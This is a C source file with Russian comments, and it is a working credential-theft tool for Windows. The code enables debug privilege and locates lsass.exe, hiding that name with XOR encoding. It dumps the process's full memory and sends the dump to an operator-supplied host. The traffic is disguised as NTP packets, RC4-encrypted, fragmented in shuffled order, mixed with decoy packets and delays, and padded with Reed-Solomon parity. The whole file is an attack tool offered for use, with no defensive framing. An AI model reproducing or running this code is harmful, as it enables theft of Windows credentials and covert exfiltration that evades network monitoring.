#include "dumper.h"

// ---------------------
// Глобальные таблицы GF(256)
// ---------------------
unsigned char gf_exp[512];
unsigned char gf_log[256];

// --------------------------------------------------
// 1. Инициализация GF(256) / FEC (Reed-Solomon)
// --------------------------------------------------
void init_gf() {
    unsigned char x = 1;
    for (int i = 0; i < 255; i++) {
        gf_exp[i] = x;
        gf_log[x] = i;
        x <<= 1;
        if (x & 0x100)
            x ^= 0x11d;
    }
    // "дублируем" для удобства, чтобы не делать %255 при обращении
    for (int i = 255; i < 512; i++) {
        gf_exp[i] = gf_exp[i - 255];
    }
}

unsigned char gf_mul(unsigned char a, unsigned char b) {
    if (a == 0 || b == 0)
        return 0;
    int log_a = gf_log[a];
    int log_b = gf_log[b];
    int log_result = log_a + log_b;
    return gf_exp[log_result % 255];
}

// генерация m символов паритетных данных (генератор Вандермонде)
void rs_encode_block(const unsigned char *data, int k, unsigned char *parity, int m) {
    for (int j = 0; j < m; j++) {
        parity[j] = 0;
        for (int i = 0; i < k; i++) {
            unsigned char coefficient = gf_exp[(i * (j + 1)) % 255];
            parity[j] ^= gf_mul(data[i], coefficient);
        }
    }
}

// --------------------------------------------------
// 2. RC4
// --------------------------------------------------
void rc4_init(unsigned char *S, const unsigned char *key, int keylen) {
    for (int i = 0; i < 256; i++) {
        S[i] = (unsigned char)i;
    }
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) & 0xFF;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
}

void rc4_crypt(unsigned char *S, const unsigned char *in, unsigned char *out, int len) {
    int i = 0, j = 0;
    for (int k = 0; k < len; k++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        unsigned char rnd = S[(S[i] + S[j]) & 0xFF];
        out[k] = in[k] ^ rnd;
    }
}

// --------------------------------------------------
// 3. Привилегии / Дамп памяти
// --------------------------------------------------
BOOL EnableDebugPrivilege(void) {
    HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
    if (!hAdvapi) {
        printf("[!] Failed to load advapi32.dll.\n");
        return FALSE;
    }

    typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
    typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

    pOpenProcessToken fOpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi, "OpenProcessToken");
    pLookupPrivilegeValueW fLookupPrivilegeValueW = (pLookupPrivilegeValueW)GetProcAddress(hAdvapi, "LookupPrivilegeValueW");
    pAdjustTokenPrivileges fAdjustTokenPrivileges = (pAdjustTokenPrivileges)GetProcAddress(hAdvapi, "AdjustTokenPrivileges");

    if (!fOpenProcessToken || !fLookupPrivilegeValueW || !fAdjustTokenPrivileges) {
        printf("[!] Failed to retrieve one or more functions from advapi32.dll.\n");
        return FALSE;
    }

    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!fOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed.\n");
        return FALSE;
    }
    if (!fLookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[!] LookupPrivilegeValue failed.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!fAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] The token does not have the required privilege.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
    DWORD pid = 0;

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
        return 0;

    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL   (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);

    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = 
        (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32FirstW fProcess32FirstW = 
        (pProcess32FirstW)GetProcAddress(hKernel32, "Process32FirstW");
    pProcess32NextW fProcess32NextW = 
        (pProcess32NextW)GetProcAddress(hKernel32, "Process32NextW");
    pCloseHandle fCloseHandle = 
        (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");

    if (!fCreateToolhelp32Snapshot || !fProcess32FirstW || !fProcess32NextW || !fCloseHandle) {
        return 0;
    }

    HANDLE hSnapshot = fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (fProcess32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (fProcess32NextW(hSnapshot, &pe));
    }
    fCloseHandle(hSnapshot);
    return pid;
}

BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
    HMODULE hDbgHelp = LoadLibraryW(L"DbgHelp.dll");
    if (!hDbgHelp)
        return FALSE;

    typedef BOOL (WINAPI *MiniDumpWriteDumpType)(
        HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
        PMINIDUMP_EXCEPTION_INFORMATION,
        PMINIDUMP_USER_STREAM_INFORMATION,
        PMINIDUMP_CALLBACK_INFORMATION
    );

    MiniDumpWriteDumpType MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!MiniDumpWriteDumpFunc) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    char tempPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tempPath)) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    char tempFile[MAX_PATH];
    sprintf(tempFile, "%s\\dumpfile_%u.dmp", tempPath, GetCurrentProcessId());

    HANDLE hFile = CreateFileA(
        tempFile, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    BOOL success = MiniDumpWriteDumpFunc(
        hProcess, pid, hFile,
        MiniDumpWithFullMemory,
        NULL, NULL, NULL
    );
    if (!success) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }

    LARGE_INTEGER liSize;
    if (!GetFileSizeEx(hFile, &liSize)) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }
    *dumpSize = (size_t)liSize.QuadPart;

    *dumpBuffer = (char*)malloc(*dumpSize);
    if (!*dumpBuffer) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL) 
        || bytesRead != *dumpSize)
    {
        free(*dumpBuffer);
        *dumpBuffer = NULL;
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);
    FreeLibrary(hDbgHelp);
    DeleteFileA(tempFile);
    return TRUE;
}

// --------------------------------------------------
// 4. Утилиты (строковые и т. п.)
// --------------------------------------------------
wchar_t* ConvertToWideChar(const char* charStr) {
    int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);
    wchar_t* wStr = (wchar_t*)malloc(sizeNeeded * sizeof(wchar_t));
    if (wStr) {
        MultiByteToWideChar(CP_ACP, 0, charStr, -1, wStr, sizeNeeded);
    }
    return wStr;
}

void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
    size_t i = 0;
    while (encoded[i] != L'\0' && i < maxLen - 1) {
        decoded[i] = encoded[i] ^ key;
        i++;
    }
    decoded[i] = L'\0';
}

// --------------------------------------------------
// 5. Создание / отправка NTP-пакетов
// --------------------------------------------------
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
    memset(packet, 0, 48);
    packet[0] = 0x1B; // LI=0, VN=3, Mode=3
    memcpy(packet + 40, payload, 8);
}

int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
    HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
    if (!hWs2_32)
        return -1;

    typedef int    (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
    typedef SOCKET (WSAAPI *pSocket)(int, int, int);
    typedef int    (WSAAPI *pSendTo)(SOCKET, const char*, int, int, const struct sockaddr*, int);
    typedef int    (WSAAPI *pClosesocket)(SOCKET);
    typedef int    (WSAAPI *pWSACleanup)(void);

    pWSAStartup   fWSAStartup   = (pWSAStartup)  GetProcAddress(hWs2_32, "WSAStartup");
    pSocket       fSocket       = (pSocket)      GetProcAddress(hWs2_32, "socket");
    pSendTo       fSendTo       = (pSendTo)      GetProcAddress(hWs2_32, "sendto");
    pClosesocket  fClosesocket  = (pClosesocket) GetProcAddress(hWs2_32, "closesocket");
    pWSACleanup   fWSACleanup   = (pWSACleanup)  GetProcAddress(hWs2_32, "WSACleanup");

    if (!fWSAStartup || !fSocket || !fSendTo || !fClosesocket || !fWSACleanup) {
        return -1;
    }

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;

    if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    sock = fSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        fWSACleanup();
        return -1;
    }

    // Пробуем bind на локальный порт 123 (имитация NTP-клиента)
    struct sockaddr_in localAddr;
    memset(&localAddr, 0, sizeof(localAddr));
    localAddr.sin_family      = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port        = htons(123);
    bind(sock, (struct sockaddr*)&localAddr, sizeof(localAddr));

    // Указываем адрес получателя
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    // Формируем пакет
    unsigned char packet[48];
    CreateNTPPacket(payload, packet);

    int result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));

    fClosesocket(sock);
    fWSACleanup();
    return result;
}

int SendDecoyNTPPacket(const char *target_ip, int target_port) {
    unsigned char payload[8];
    // Первый 32-бит: (число секунд с 1900 года + случайная погрешность)
    unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
    payload[0] = (current_ntp >> 24) & 0xFF;
    payload[1] = (current_ntp >> 16) & 0xFF;
    payload[2] = (current_ntp >> 8)  & 0xFF;
    payload[3] = (current_ntp & 0xFF);

    // Вторые 32-бит: "доля секунды"
    unsigned int fraction = rand();
    payload[4] = (fraction >> 24) & 0xFF;
    payload[5] = (fraction >> 16) & 0xFF;
    payload[6] = (fraction >> 8)  & 0xFF;
    payload[7] = (fraction & 0xFF);

    if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
        printf("[!] Failed to send decoy packet.\n");
        return -1;
    }
    printf("[+] Decoy packet sent.\n");
    return 0;
}

// --------------------------------------------------
// 6. Отправка дампа (без сжатия!) + RC4 + FEC
// --------------------------------------------------
int SendDumpAsNTP(const char *target_ip, int target_port, const char *dumpData, size_t dumpSize) {
    // Подсчитываем количество фрагментов
    int total_fragments = (int)((dumpSize + FRAGMENT_SIZE - 1) / FRAGMENT_SIZE);

    // Отправляем заголовок (8 байт):
    // [0..3] = total_fragments (big-endian)
    // [4..7] = dumpSize (big-endian)
    unsigned char header[8];
    header[0] = (unsigned char)((total_fragments >> 24) & 0xFF);
    header[1] = (unsigned char)((total_fragments >> 16) & 0xFF);
    header[2] = (unsigned char)((total_fragments >>  8) & 0xFF);
    header[3] = (unsigned char)((total_fragments      ) & 0xFF);

    header[4] = (unsigned char)(((unsigned int)dumpSize >> 24) & 0xFF);
    header[5] = (unsigned char)(((unsigned int)dumpSize >> 16) & 0xFF);
    header[6] = (unsigned char)(((unsigned int)dumpSize >>  8) & 0xFF);
    header[7] = (unsigned char)(((unsigned int)dumpSize      ) & 0xFF);

    if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
        printf("[!] Failed to send header packet.\n");
        return -1;
    }
    printf("[+] Header sent: %d fragments, %zu total bytes.\n", total_fragments, dumpSize);

    // Перемешиваем индексы (случайный порядок отправки)
    int *indices = (int*)malloc(total_fragments * sizeof(int));
    if (!indices) {
        printf("[!] Memory allocation failed for indices.\n");
        return -1;
    }
    for (int i = 0; i < total_fragments; i++) {
        indices[i] = i;
    }
    for (int i = total_fragments - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = indices[i];
        indices[i] = indices[j];
        indices[j] = tmp;
    }

    // Отправляем данные по фрагментам
    for (int k = 0; k < total_fragments; k++) {
        int seq = indices[k];
        unsigned char payload[8];

        // Первые 4 байта - "псевдо-таймстамп"
        unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
        payload[0] = (unsigned char)((current_ntp >> 24) & 0xFF);
        payload[1] = (unsigned char)((current_ntp >> 16) & 0xFF);
        payload[2] = (unsigned char)((current_ntp >>  8) & 0xFF);
        payload[3] = (unsigned char)( current_ntp        & 0xFF);

        // Вторые 4 байта (шифруются RC4):
        // Содержат (16 бит номера фрагмента << 16) + (16 бит данных фрагмента)
        int offset = seq * FRAGMENT_SIZE;
        int remaining = (int)dumpSize - offset;
        uint16_t frag_val = 0;
        if (remaining > 0) {
            frag_val = (unsigned char)dumpData[offset] << 8;
            if (remaining > 1) {
                frag_val |= (unsigned char)dumpData[offset + 1];
            }
        }
        uint32_t plain = ((uint32_t)(seq & 0xFFFF) << 16) | frag_val;

        unsigned char plain_bytes[4];
        plain_bytes[0] = (unsigned char)((plain >> 24) & 0xFF);
        plain_bytes[1] = (unsigned char)((plain >> 16) & 0xFF);
        plain_bytes[2] = (unsigned char)((plain >>  8) & 0xFF);
        plain_bytes[3] = (unsigned char)( plain        & 0xFF);

        // RC4 init + skip
        unsigned char S[256];
        rc4_init(S, (const unsigned char*)RC4_KEY, (int)strlen(RC4_KEY));

        int skip = (seq * 7) & 0xFF;
        unsigned char dummy;
        for (int i = 0; i < skip; i++) {
            rc4_crypt(S, &dummy, &dummy, 1);
        }

        // Шифруем 4 байта
        unsigned char cipher[4];
        rc4_crypt(S, plain_bytes, cipher, 4);

        payload[4] = cipher[0];
        payload[5] = cipher[1];
        payload[6] = cipher[2];
        payload[7] = cipher[3];

        // Отправляем сам пакет
        if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
            printf("[!] Failed to send packet for fragment %d.\n", seq);
            free(indices);
            return -1;
        }
        printf("[+] Data packet for fragment %d/%d sent.\n", seq + 1, total_fragments);

        // Периодически отправляем «decoy»-пакет
        if (rand() % 5 == 0) {
            SendDecoyNTPPacket(target_ip, target_port);
        }
        // Небольшая пауза
        Sleep((rand() % (BASE_DELAY_MAX - BASE_DELAY_MIN + 1)) + BASE_DELAY_MIN);
    }
    free(indices);

    // Генерируем FEC-блоки (RS)
    int block_start = 0;
    int block_index = 0;
    while (block_start < total_fragments) {
        int k_block = (total_fragments - block_start < BLOCK_SIZE)
                        ? (total_fragments - block_start)
                        : BLOCK_SIZE;

        int m = k_block; // равное число паритетных фрагментов

        // Готовим массив для двух «байтов» фрагмента
        unsigned char data_block[BLOCK_SIZE];
        unsigned char parity0[BLOCK_SIZE]; 
        unsigned char parity1[BLOCK_SIZE];

        memset(parity0, 0, BLOCK_SIZE);
        memset(parity1, 0, BLOCK_SIZE);

        // Позиция 0 (первый байт во фрагменте)
        for (int i = 0; i < k_block; i++) {
            int frag_idx = block_start + i;
            int offset = frag_idx * FRAGMENT_SIZE;
            unsigned char sym = 0;
            if (offset < dumpSize) {
                sym = (unsigned char)dumpData[offset];
            }
            data_block[i] = sym;
        }
        rs_encode_block(data_block, k_block, parity0, m);

        // Позиция 1 (второй байт)
        for (int i = 0; i < k_block; i++) {
            int frag_idx = block_start + i;
            int offset = frag_idx * FRAGMENT_SIZE + 1;
            unsigned char sym = 0;
            if (offset < dumpSize) {
                sym = (unsigned char)dumpData[offset];
            }
            data_block[i] = sym;
        }
        rs_encode_block(data_block, k_block, parity1, m);

        // Отправляем m фрагментов FEC
        for (int j = 0; j < m; j++) {
            unsigned char payload[8];
            unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
            payload[0] = (unsigned char)((current_ntp >> 24) & 0xFF);
            payload[1] = (unsigned char)((current_ntp >> 16) & 0xFF);
            payload[2] = (unsigned char)((current_ntp >>  8) & 0xFF);
            payload[3] = (unsigned char)( current_ntp        & 0xFF);

            // fec_seq с признаком FEC (MSB=1) + индекс
            int fec_seq = 0x80000000 | ((block_index * BLOCK_SIZE + j) & 0x7FFFFFFF);

            // Собираем 16 бит fec_seq + 16 бит (parity0 << 8 | parity1)
            uint32_t plain = 
                (((uint32_t)fec_seq & 0xFFFF) << 16) 
                 | 
                (((uint32_t)parity0[j] << 8) | parity1[j]);

            unsigned char plain_bytes[4];
            plain_bytes[0] = (unsigned char)((plain >> 24) & 0xFF);
            plain_bytes[1] = (unsigned char)((plain >> 16) & 0xFF);
            plain_bytes[2] = (unsigned char)((plain >>  8) & 0xFF);
            plain_bytes[3] = (unsigned char)( plain        & 0xFF);

            // RC4 init + skip
            unsigned char S[256];
            rc4_init(S, (const unsigned char*)RC4_KEY, (int)strlen(RC4_KEY));

            int skip = ((block_index * BLOCK_SIZE + j) * 13) & 0xFF;
            unsigned char dummy;
            for (int i = 0; i < skip; i++) {
                rc4_crypt(S, &dummy, &dummy, 1);
            }

            unsigned char cipher[4];
            rc4_crypt(S, plain_bytes, cipher, 4);

            payload[4] = cipher[0];
            payload[5] = cipher[1];
            payload[6] = cipher[2];
            payload[7] = cipher[3];

            if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
                printf("[!] Failed to send FEC packet for block %d, index %d.\n", block_index, j);
            } else {
                printf("[+] FEC packet for block %d, index %d sent.\n", block_index, j);
            }
            Sleep((rand() % (BASE_DELAY_MAX - BASE_DELAY_MIN + 1)) + BASE_DELAY_MIN);
        }
        block_index++;
        block_start += k_block;
    }
    printf("[+] All data and FEC packets sent.\n");
    return total_fragments;
}

// --------------------------------------------------
// 7. Ретрансляции (если получаем feedback о потерях)
// --------------------------------------------------
void ProcessRetransmissions(const char *target_ip, int target_port, const char *dumpData, size_t dumpSize, int total_fragments) {
    int attempt = 0;
    int missingCount = 0;

    do {
        SOCKET fbSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (fbSock == INVALID_SOCKET) {
            printf("[!] Failed to create feedback socket.\n");
            return;
        }
        int rcvbuf = SOCKET_RCVBUF_SIZE;
        setsockopt(fbSock, SOL_SOCKET, SO_RCVBUF, (const char*)&rcvbuf, sizeof(rcvbuf));

        struct sockaddr_in localAddr;
        memset(&localAddr, 0, sizeof(localAddr));
        localAddr.sin_family      = AF_INET;
        localAddr.sin_addr.s_addr = INADDR_ANY;
        localAddr.sin_port        = htons(123);

        if (bind(fbSock, (struct sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
            printf("[!] Failed to bind feedback socket.\n");
            closesocket(fbSock);
            return;
        }

        int timeout = FEEDBACK_TIMEOUT;
        setsockopt(fbSock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        char fbBuffer[1024];
        struct sockaddr_in senderAddr;
        int addrLen = sizeof(senderAddr);

        int recvLen = recvfrom(fbSock, fbBuffer, sizeof(fbBuffer), 0, (struct sockaddr*)&senderAddr, &addrLen);
        closesocket(fbSock);

        if (recvLen > 0) {
            // Первые 4 байта – это missingCount
            missingCount = ( (fbBuffer[0] & 0xFF) << 24 )
                         | ( (fbBuffer[1] & 0xFF) << 16 )
                         | ( (fbBuffer[2] & 0xFF) <<  8 )
                         | ( (fbBuffer[3] & 0xFF)      );
            if (missingCount <= 0) {
                printf("[+] No missing fragments reported.\n");
                break;
            }
            printf("[*] Feedback received: %d missing fragments. Retransmitting...\n", missingCount);

            for (int i = 0; i < missingCount; i++) {
                int offset = 4 + i * 4;
                int seq = ( (fbBuffer[offset+0] & 0xFF) << 24 )
                        | ( (fbBuffer[offset+1] & 0xFF) << 16 )
                        | ( (fbBuffer[offset+2] & 0xFF) <<  8 )
                        | ( (fbBuffer[offset+3] & 0xFF)      );

                // Снова формируем RC4-шифрованный фрагмент
                unsigned char payload[8];
                unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
                payload[0] = (unsigned char)((current_ntp >> 24) & 0xFF);
                payload[1] = (unsigned char)((current_ntp >> 16) & 0xFF);
                payload[2] = (unsigned char)((current_ntp >>  8) & 0xFF);
                payload[3] = (unsigned char)( current_ntp        & 0xFF);

                uint16_t frag_val = 0;
                int data_offset = seq * FRAGMENT_SIZE;
                int remaining = (int)dumpSize - data_offset;
                if (remaining > 0) {
                    frag_val = (unsigned char)dumpData[data_offset] << 8;
                    if (remaining > 1) {
                        frag_val |= (unsigned char)dumpData[data_offset + 1];
                    }
                }
                uint32_t plain = ((uint32_t)(seq & 0xFFFF) << 16) | frag_val;

                unsigned char plain_bytes[4];
                plain_bytes[0] = (unsigned char)((plain >> 24) & 0xFF);
                plain_bytes[1] = (unsigned char)((plain >> 16) & 0xFF);
                plain_bytes[2] = (unsigned char)((plain >>  8) & 0xFF);
                plain_bytes[3] = (unsigned char)( plain        & 0xFF);

                unsigned char S[256];
                rc4_init(S, (const unsigned char*)RC4_KEY, (int)strlen(RC4_KEY));

                int skip = (seq * 7) & 0xFF;
                unsigned char dummy;
                for (int j = 0; j < skip; j++) {
                    rc4_crypt(S, &dummy, &dummy, 1);
                }

                unsigned char cipher[4];
                rc4_crypt(S, plain_bytes, cipher, 4);

                payload[4] = cipher[0];
                payload[5] = cipher[1];
                payload[6] = cipher[2];
                payload[7] = cipher[3];

                if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
                    printf("[!] Failed to retransmit packet %d.\n", seq);
                } else {
                    printf("[+] Packet %d retransmitted.\n", seq);
                }
                Sleep((rand() % (BASE_DELAY_MAX - BASE_DELAY_MIN + 1)) + BASE_DELAY_MIN);
            }
        } else {
            printf("[!] No feedback received in this cycle.\n");
            missingCount = 0;
        }
        attempt++;
    } while (missingCount > 0 && attempt < MAX_RETRANS);

    if (missingCount > 0) {
        printf("[!] Retransmission ended with %d fragments still missing.\n", missingCount);
    } else {
        printf("[+] All missing fragments retransmitted successfully.\n");
    }
}

// --------------------------------------------------
// 8. main()
// --------------------------------------------------
int main(void) {
    srand((unsigned int)time(NULL));
    init_gf(); // Инициализация GF(256) для RS

    // Включаем SeDebugPrivilege
    if (!EnableDebugPrivilege()) {
        printf("[!] Failed to enable SeDebugPrivilege.\n");
        return 1;
    }

    // «Зашифрованная» строка "lsass.exe" (XOR 0x13)
    wchar_t encodedTarget[] = {
        'l'^0x13, 's'^0x13, 'a'^0x13, 's'^0x13,
        's'^0x13, '.'^0x13, 'e'^0x13, 'x'^0x13,
        'e'^0x13, L'\0'
    };
    wchar_t targetProcessName[256];
    DecodeString(encodedTarget, 0x13, targetProcessName, 256);
    wprintf(L"[*] Decoded target process: %s\n", targetProcessName);

    // Читаем IP и порт
    char target_ip[64];
    int target_port;
    printf("[*] Enter receiver IP: ");
    if (scanf("%63s", target_ip) != 1) {
        printf("[!] Failed to read receiver IP.\n");
        return 1;
    }
    printf("[*] Enter receiver port: ");
    if (scanf("%d", &target_port) != 1) {
        printf("[!] Failed to read receiver port.\n");
        return 1;
    }

    // Получаем PID lsass.exe
    DWORD pid = GetTargetProcessPID(targetProcessName);
    if (pid == 0) {
        printf("[!] Target process not found.\n");
        return 1;
    }
    wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);

    // Дампим память
    char *dumpBuffer = NULL;
    size_t dumpSize = 0;
    if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
        printf("[!] Failed to dump process memory.\n");
        return 1;
    }
    printf("[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);

    // Отправляем дамп напрямую (без всякого сжатия!)
    int total_fragments = SendDumpAsNTP(target_ip, target_port, dumpBuffer, dumpSize);
    if (total_fragments == -1) {
        printf("[!] Failed to send dump.\n");
        free(dumpBuffer);
        return 1;
    }
    printf("[+] Initial transmission completed.\n");

    // Ретрансляции (если есть feedback)
    ProcessRetransmissions(target_ip, target_port, dumpBuffer, dumpSize, total_fragments);

    free(dumpBuffer);
    printf("[+] Done!\n");
    return 0;
}
